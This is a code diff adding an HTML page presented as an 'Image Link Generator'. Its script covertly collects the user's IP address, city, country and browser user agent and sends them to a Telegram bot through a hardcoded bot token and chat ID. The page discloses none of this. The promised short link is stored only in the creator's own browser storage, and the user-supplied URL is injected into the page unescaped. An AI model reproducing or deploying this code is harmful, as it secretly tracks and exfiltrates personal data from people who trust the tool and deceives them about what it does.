@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Link Generator</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f0f2f5;
+        }
+
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+
+        input[type="text"], input[type="file"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+
+        button {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+        }
+
+        .result {
+            margin-top: 20px;
+            word-wrap: break-word;
+        }
+
+        .copy-btn {
+            background: #28a745;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Image Link Generator</h1>
+        
+        <input type="text" id="url" placeholder="Enter your link here">
+        <input type="file" id="image" accept="image/*">
+        <button onclick="generateLink()">Generate Link</button>
+        
+        <div class="result" id="result"></div>
+    </div>
+
+    <script>
+        async function generateLink() {
+            const url = document.getElementById('url').value;
+            const image = document.getElementById('image').files[0];
+            
+            if (!url || !image) {
+                alert('Please fill all fields');
+                return;
+            }
+
+            // Convert image to Base64
+            const reader = new FileReader();
+            reader.readAsDataURL(image);
+            
+            reader.onload = async () => {
+                const imageData = reader.result;
+                
+                // Get user details
+                const ip = await fetch('https://api.ipify.org?format=json')
+                    .then(res => res.json())
+                    .then(data => data.ip);
+
+                const location = await fetch(`https://ipapi.co/${ip}/json/`)
+                    .then(res => res.json());
+
+                const userAgent = navigator.userAgent;
+                
+                // Send to Telegram
+                const telegramToken = '7487768405:AAHivvY7f_SjAw13ZgYQeUYwgCQ-2FkTKjs';
+                const chatId = '7749024395';
+                
+                const text = `New Link Created!\nIP: ${ip}\nLocation: ${location.city}, ${location.country}\nUser Agent: ${userAgent}`;
+
+                await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: text
+                    })
+                });
+
+                // Generate short link
+                const randomId = Math.random().toString(36).substr(2, 5);
+                const shortLink = `${window.location.href}#${randomId}`;
+                
+                // Save data to localStorage
+                localStorage.setItem(randomId, JSON.stringify({
+                    url: url,
+                    image: imageData
+                }));
+
+                // Show result
+                const resultDiv = document.getElementById('result');
+                resultDiv.innerHTML = `
+                    <p>Your Image Link:</p>
+                    <input type="text" value="${shortLink}" readonly>
+                    <button class="copy-btn" onclick="copyToClipboard('${shortLink}')">Copy Link</button>
+                `;
+            };
+        }
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text);
+            alert('Link copied!');
+        }
+
+        // Check for hash on page load
+        window.onload = () => {
+            const hash = window.location.hash.substr(1);
+            if (hash) {
+                const data = localStorage.getItem(hash);
+                if (data) {
+                    const {url, image} = JSON.parse(data);
+                    document.body.innerHTML = `
+                        <a href="${url}" target="_blank">
+                            <img src="${image}" style="max-width: 100%; height: auto;">
+                        </a>
+                    `;
+                }
+            }
+        }
+    </script>
+</body>
+</html>
